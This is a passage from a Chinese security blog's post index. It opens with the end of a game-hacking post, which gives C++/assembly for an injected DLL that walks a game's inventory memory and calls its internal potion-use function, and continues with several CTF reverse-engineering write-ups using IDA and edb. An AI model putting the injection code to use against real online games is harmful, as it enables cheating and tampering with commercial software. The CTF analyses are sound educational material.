class=\"number\">2</span>DCFA3B8              <span class=\"comment\">//血瓶地址</span></span><br><span class=\"line\">mov ecx,[<span class=\"number\">0142e368</span>]           <span class=\"comment\">//背包基地址</span></span><br><span class=\"line\">call <span class=\"number\">00</span>A03C60</span><br></pre></td></tr></table></figure>\n\n<p>这个call，如果说从push和call内部的ret来看他只有一个参数，但是其实他有两个参数，其中一个是push，另一个是通过给ecx，然后call内部进行调用。 调用这个call只要传参正确就直接实现了吃药，具体效果我就不发了。这里我简单的说一下他这个背包地址和血瓶地址怎么来。</p>\n<p>首先是背包基地址，直接通过血瓶的数量反推就可以直接得到。反推的过程可以算出一个表达式：</p>\n<p><strong>背包物品&#x3D;0142E368]+0x54]+i*4]</strong></p>\n<p>然后去查找一些偏移，发现+0x20偏移存的是数量   +0x8的位置存的是物品ID。每个物品的ID是唯一的，我们就可以去记录这个药品的ID,然后写一个程序去遍历物品在判断该物品的ID是否为血瓶，这样就可以得到了血瓶的地址，然后就可以去调用了。这里我简单贴一下我的C++代码：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) <span class=\"built_in\">Call_Blood</span>()</span><br><span class=\"line\">         </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">         </span><br><span class=\"line\">                 _asm</span><br><span class=\"line\">         </span><br><span class=\"line\">                 &#123;</span><br><span class=\"line\">         </span><br><span class=\"line\">                          pushad</span><br><span class=\"line\">         </span><br><span class=\"line\">                          push g_dwBloodAddr   <span class=\"comment\">//对象地址</span></span><br><span class=\"line\">         </span><br><span class=\"line\">                          mov ecx, [Base_Pack]</span><br><span class=\"line\">         </span><br><span class=\"line\">                          mov eax, <span class=\"number\">0x00A03C60</span></span><br><span class=\"line\">         </span><br><span class=\"line\">                          call eax</span><br><span class=\"line\">         </span><br><span class=\"line\">                          popad</span><br><span class=\"line\">         </span><br><span class=\"line\">                          ret</span><br><span class=\"line\">         </span><br><span class=\"line\">                 &#125;</span><br><span class=\"line\">         </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">         </span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">TraversingObject</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">         </span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">         </span><br><span class=\"line\">                 DWORD actorArray = <span class=\"number\">0</span>, count = <span class=\"number\">0</span>, id = <span class=\"number\">0</span>;</span><br><span class=\"line\">         </span><br><span class=\"line\">                 <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">180</span>; i++)</span><br><span class=\"line\">         </span><br><span class=\"line\">                 &#123;</span><br><span class=\"line\">         </span><br><span class=\"line\">                          actorArray = *(DWORD*)Base_Pack + <span class=\"number\">0x54</span>;</span><br><span class=\"line\">         </span><br><span class=\"line\">                          actorArray = *(DWORD*)actorArray + i * <span class=\"number\">0x4</span>;</span><br><span class=\"line\">         </span><br><span class=\"line\">                          actorArray = *(DWORD*)actorArray;</span><br><span class=\"line\">         </span><br><span class=\"line\">                          <span class=\"comment\">/*读取物品数量和ID*/</span></span><br><span class=\"line\">         </span><br><span class=\"line\">                          <span class=\"built_in\">ReadProcessMemory</span>(<span class=\"built_in\">GetCurrentProcess</span>(), (LPVOID)(actorArray + <span class=\"number\">0x20</span>), &amp;count, <span class=\"built_in\">sizeof</span>(DWORD), <span class=\"literal\">NULL</span>);  </span><br><span class=\"line\">         </span><br><span class=\"line\">                          <span class=\"built_in\">ReadProcessMemory</span>(<span class=\"built_in\">GetCurrentProcess</span>(), (LPVOID)(actorArray + <span class=\"number\">0x8</span>), &amp;id, <span class=\"built_in\">sizeof</span>(DWORD), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">         </span><br><span class=\"line\">                          <span class=\"keyword\">if</span> (<span class=\"number\">0x00213D7C</span> == id)  <span class=\"comment\">//血</span></span><br><span class=\"line\">         </span><br><span class=\"line\">                                  g_dwBloodAddr = actorArray;</span><br><span class=\"line\">         </span><br><span class=\"line\">                 &#125;</span><br><span class=\"line\">         </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">         </span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">CDEBUG::OnBnClickedButton2</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">         </span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">         </span><br><span class=\"line\">                 <span class=\"comment\">// <span class=\"doctag\">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class=\"line\">         </span><br><span class=\"line\">                 <span class=\"keyword\">if</span> (<span class=\"literal\">NULL</span> == g_dwBloodAddr)</span><br><span class=\"line\">         </span><br><span class=\"line\">                          <span class=\"built_in\">TraversingObject</span>();</span><br><span class=\"line\">         </span><br><span class=\"line\">                 <span class=\"built_in\">Call_Blood</span>();</span><br><span class=\"line\">         </span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>我这里是编写为带有MFC窗口的DLL，注入游戏后会弹出一个窗口，然后点击一下Button2就可以实现吃药了。</p>\n<h1 id=\"三、总结\"><a href=\"#三、总结\" class=\"headerlink\" title=\"三、总结\"></a>三、总结</h1><p>在分析这个游戏时，深刻认识到了什么叫做吃瘪，笔者刚刚开始是通过血瓶数量、ID、地址去逆向反推血瓶call，然后开始遇到各种奇葩，因为如果你用CE去访问什么写入了血瓶数量，你会发现，无论什么时候，他传进去的总是使用后的血瓶数量**(当前数量-1)**。就是说他血瓶数量减少的代码段并不在当前访问的代码段，而是在其他地方。然后笔者就继续分析数量企图找出被减少的代码段，发现代码有加密运算，经过一顿骚操作后，我直接尝试nop大法，发现。。。。nop后还能吃药，就说明我找错了。。</p>\n<p>![](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;Untitled 11.png)</p>\n<p>然后尝试其他方法，反正就各种吃瘪，最后还找到了播放粒子特效的call。。。然后被迫用send发包，简单的处理之后直接找到吃药call。虽然说找call的整个过程稍微有点心累，但是总的来说收获还是挺多的，因为在找背包数组的时候还是稍微吃点逻辑，另外就是send发包的一个灵活处理。</p>\n","categories":["GameHacker"]},{"title":"攻防世界-逆向题笔记{insanity}","url":"/2024/04/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Binsanity%7D/","content":"<p>分析对象：insanity</p>\n<p>工具：Kali-Linux、Ida</p>\n<p>步骤：1）、运行查看效果</p>\n<p>2）、PE工具查壳</p>\n<p>3）、查看文件平台</p>\n<p>4）、如果有壳就脱壳，无壳进行第四步</p>\n<p>5）、文件拖入ida进行分析</p>\n<p><strong>一、运行查看效果</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Binsanity%7D/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p><strong>二、PE工具查壳</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Binsanity%7D/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>无壳</p>\n<p><strong>三、查看文件平台</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Binsanity%7D/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>清楚看到是32bit obj，所以该文件为32位。我们直接打开32位ida。</p>\n<p><strong>四、脱壳</strong></p>\n<p>无</p>\n<p><strong>五、Ida分析</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Binsanity%7D/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>依旧先搜索字符串</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Binsanity%7D/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>发现了类似明文的flag。我们去看看<strong>main函数</strong>的伪代码。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Binsanity%7D/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>我们双击<strong>strs</strong>看看内容</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Binsanity%7D/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>发现这其中存着着许多字符串并且还包含了刚刚看到的flag，返回到<strong>main</strong>函数分析一下最后一个put</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Binsanity%7D/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>发现输出的内容由<strong>v4</strong>决定，而<strong>v4</strong>又是随机数。所以知道该程序每次运行都会随机<strong>strs</strong>里的内容，可能偶然会输出flag。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Binsanity%7D/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p><strong>总结：</strong></p>\n<p>无总结</p>\n","categories":["CTF"]},{"title":"攻防世界-逆向题笔记{logmein}","url":"/2024/04/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/","content":"<p>分析对象：simple-unpack</p>\n<p>工具：Kali-Linux、Ida、Python</p>\n<p>步骤：1）、运行查看效果</p>\n<p>2）、PE工具查壳</p>\n<p>3）、查看文件平台</p>\n<p>4）、如果有壳就脱壳，无壳进行第四步</p>\n<p>5）、文件拖入ida进行分析</p>\n<p>6）、解密</p>\n<p><strong>一、运行查看效果</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p><strong>二、PE工具查壳</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>无壳</p>\n<p><strong>三、查看文件平台</strong></p>\n<p>从第二步可以知道该文件为64位，所以我们需要64位的ida进行分析。</p>\n<p><strong>四、无</strong></p>\n<p><strong>五、Ida分析</strong></p>\n<p>加载完毕后，首先搜索字符串</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>通过字符串，没发现类似明文的flag，但是可以看到输出的信息。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>我们在左边的函数窗口找到main函数，然后F5查看伪代码。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>看到第二句代码很可疑，把一串内容复制到v8。和我们之前练的一题很像，初步猜测用于加密的密钥。往下又看到一个long long类型的变量也很可疑(<strong>后缀为LL，long long缩写</strong>)</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>往下继续看，可以看到一个比较长度和一个循环，再往下就为输入是否成功内容。到这里可以肯定，上面的for循环为加密运算，但是不同的是，他并不是把加密完成后的内容和输入内容比较，而是加密一位就比较一位。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>然后在这里我们发现一个猫腻，可以看到**(char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i])<strong>，最后强制转换为了</strong>char<strong>，而且中间的</strong>&amp;v7+ i % v6<strong>很像一个数组寻址，但是我们在上面看到</strong>v7<strong>却是一串数字，那么我们猜测他会不会是一串字符，只是ida并未正确的识别。我们到</strong>v7<strong>赋值的地方然下</strong>R键**看看。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>神奇的发现，变成了字符串，那么我们猜测是正确的。(<strong>虽然通过ida的快捷键把这里的数字转换为了字符，但是有一个地方是要考虑的，就是字节的排放顺序。大部分的linux都是小尾排放顺序，所以需要把字符串给反过来读，得到harambe，以后遇到类似 变量&#x3D;‘xxxxxxxxxx’ 的字符串赋值都需要反过来读，实在实在不明白可以通过linux下的edb调试器去查看此处的内存</strong>)</p>\n<p>接下来直接根据伪代码写一个python脚本把整个算法跑一边。以下是大概分析：</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p><strong>六、解密</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Blogmein%7D/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><strong>总结：</strong></p>\n<p>看到类似数组寻址的表达式(a1 + xx)，但是a1又不是一个数组表示方式，那么可以怀疑a1就是一个数组，只是可能ida未能正确表示。然后就是字节排序问题。小尾：低位放低位，高位放高位。大尾：高位放低位，低位放高位。红字均指的是数据的高低位。</p>\n","categories":["CTF"]},{"title":"攻防世界-逆向题笔记{open-source}","url":"/2024/04/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bopen-source%7D/","content":"<p>分析对象：open-source</p>\n<p>工具：python</p>\n<p>步骤：1）、阅读源代码</p>\n<p>2）、分析源代码</p>\n<p>3）、编写脚本运行</p>\n<p><strong>一、阅读源代码</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bopen-source%7D/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p>用到了命令参数。并且每个参数都有规定，flag是根据参数分析出来的。</p>\n<p><strong>二、分析源代码</strong></p>\n<p>最总表达式为：</p>\n<p>unsigned int hash &#x3D; first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207;</p>\n<p>那么拆分来看看：</p>\n<p>first：明显为0xcafe</p>\n<p>second:这个就稍微有点小麻烦，要求 (对 5 求 等于 3) 或者 (对 17 求余不能为 8)，那么我们实现他的反证，即 (对 5 求余 不等于3) 且 (对17求余 等于8)，这个写一个遍历器就可以了。</p>\n<p>strlen(argv[3]):很明显长度直接可以看出来，为 7</p>\n<p><strong>三、编写脚本运行</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bopen-source%7D/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>本人只测试了second为第一个值的情况，是正确的。其他值并未测试，估计不正确。</p>\n<p><strong>总结：</strong></p>\n<p>这题太简单，没什么好总结 ，就是这么膨胀！ &#x3D;。&#x3D;</p>\n","categories":["CTF"]},{"title":"攻防世界-逆向题笔记{no-strings-attached}","url":"/2024/04/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/","content":"<p>分析对象：no-strings-attached</p>\n<p>工具：Kali-Linux、Ida、python、edb</p>\n<p>步骤：1）、运行查看效果</p>\n<p>2）、PE工具查壳</p>\n<p>3）、查看文件平台</p>\n<p>4）、如果有壳就脱壳，无壳进行第四步</p>\n<p>5）、文件拖入ida进行分析</p>\n<p>6）、解密</p>\n<p>6.1、手撕加密</p>\n<p>6.2、edb调试</p>\n<p><strong>一、运行查看效果</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p><strong>二、PE工具查壳</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>无壳</p>\n<p><strong>三、查看文件平台</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>32位文件，故使用32位ida</p>\n<p><strong>四、脱壳</strong></p>\n<p>无</p>\n<p><strong>五、Ida分析</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>老方法，先搜索字符串</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>emmm，空空如也。那只能去<strong>main函数</strong>了。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>F5即可得到伪代码。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>经过简单的分析呢，发现最后一个函数为关键函数。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>双击进入该函数进行分析</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>这里呢，两种方法，获取flag，也就是s2。一种是手动撕加密算法；另一种是让程序自身把所有加密运算完成后，直接获取加密的结果。由于s2的值来源于<strong>decrypt</strong>函数的返回值，所以我们直接在<strong>decrypt</strong>函数尾部，等待断下后看<strong>eax</strong>的值，因为<strong>eax</strong>的值通常为函数返回值。</p>\n<p><strong>六、解密</strong></p>\n<p><strong>第一种：</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>双击进入函数，发现该函数操作的是宽字节，也就是unicode(<strong>一个字符两字节保存</strong>)。然后返回外层双击两个参数查看值。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p>首先看s的数据</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>发现他是 <strong>0x?? 0x14 0x00 0x00</strong> 这种格式去显示，为了显示更清楚，记录左边的地址，去十六进制数去看看</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p>会发现他所有的数据都是这样的。刚刚说过unicode是一个字符用两个字节保存，但是这个仅限与window下，<strong>在linux系统中，unicode都是一个字符以四个字节保存</strong>，所以会看到每个数据都是以这种格式存放 <strong>0x?? 0x14 0x00 0x00</strong> ，其中<strong>0x14</strong>是无效字符，我们不用管，直接按照小尾方式读取。那么<strong>s</strong>的数据中第一个字符为<strong>0x3A(:)<strong>，其他字符也是一样。那么我们</strong>s</strong>的数据看完了，我们去看看<strong>byte_8048A90</strong>的数据。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p>发现也是一样，都是 <strong>0x?? 0x14 0x00 0x00</strong>格式。知道这两个字符串保存什么之后，我们可以开始写脚本了。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p><strong>第二种：</strong></p>\n<p>这种方法非常实用，也很快速得到flag。我们首先在linux运行edb。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p>然后把我们的实验分析对象拖进去，或者也可以通过菜单 <strong>File-&gt;open</strong> 打开</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p>这个时候我们的程序已经在调试了，我们<strong>返回ida去看看加密运算的函数地址，</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p>红框的位置是函数头，我们在edb中跳到这个地址。按下快捷键<strong>Ctrl+G</strong>，然后输入地址，记住一定要有<strong>前缀0x</strong>。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p>点击OK，直接可以跳转到关键代码。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p>这几个函数和ida里的一样，所以我们是跳转到了正确地方。接下来按照前面的分析我们直接在这个函数尾部下断，然后观察<strong>eax</strong>的值，就可以拿到<strong>flag</strong>。我们往下拉会看到ret指令，我们选中这点指令按下<strong>F2</strong>下断，也可以单击<strong>左边红色的地址</strong>进行下断。下断成功会看到左边红色地址有一个<strong>小红点。</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p>接下来我们按下F9或者点击工具栏的</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p>让程序跑起来。运行了两次后，发现程序断在了我们下断的地方，我们看看eax</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p>记录这个值，然后在左下方的<strong>DataDump中按下Ctrl+G</strong>，跳转到这个地址。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bno-strings-attached%7D/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<p>依旧能看到flag，因为是unicode型的字符串，所以<strong>一个字符4个字节大小(Linux)。</strong></p>\n<p><strong>总结：</strong></p>\n<p>大概熟悉一下edb操作，如果本身会OD，那么edb操作基本不是问题。另外就是要知道一个东西，Window平台下的unicode是一个字符2个字节，Linux下是一个字符4个字节。</p>\n","categories":["CTF"]},{"title":"攻防世界-逆向题笔记{getit}","url":"/2024/04/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/","content":"<p>分析对象：getit</p>\n<p>工具：Ida、kali、edb、python</p>\n<p>步骤：1）、运行查看效果</p>\n<p>2）、PE工具查壳</p>\n<p>3）、查看文件平台</p>\n<p>4）、如果有壳就脱壳，无壳进行第四步</p>\n<p>5）、文件拖入ida进行分析</p>\n<p>6）、解密</p>\n<p><strong>一、运行查看效果</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p>emmm。好像没什么效果。</p>\n<p><strong>二、PE工具查壳</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>无壳</p>\n<p><strong>三、查看文件平台</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>64位的文件</p>\n<p><strong>四、脱壳</strong></p>\n<p>无</p>\n<p><strong>五、Ida分析</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bgetit%7D/document_image_rId7.png\" 